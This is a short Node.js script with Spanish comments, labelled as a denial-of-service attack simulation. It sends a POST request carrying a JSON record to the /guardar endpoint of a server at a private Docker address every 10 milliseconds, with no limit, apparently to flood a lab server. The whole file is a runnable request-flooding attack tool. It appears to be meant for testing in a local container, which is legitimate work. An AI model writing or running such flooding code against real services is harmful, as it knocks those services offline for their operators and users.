const http = require('http');

// CONFIGURACIÓN DEL OBJETIVO
const opciones = {
  hostname: '172.20.0.2', // IP del servidor en Docker
  port: 3000,
  path: '/guardar',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
};

console.log("--- SIMULACIÓN DE ATAQUE DOS INICIADA ---");

function realizarPeticion() {
  const req = http.request(opciones, (res) => {
    res.on('data', () => {}); // Consumir datos para no saturar la RAM del atacante
  });

  req.on('error', (e) => {
    console.log(`Servidor no responde: ${e.message}`);
  });

  req.write(JSON.stringify({ name: "BOT_ATTACK_" + Date.now() }));
  req.end();
}

setInterval(realizarPeticion, 10);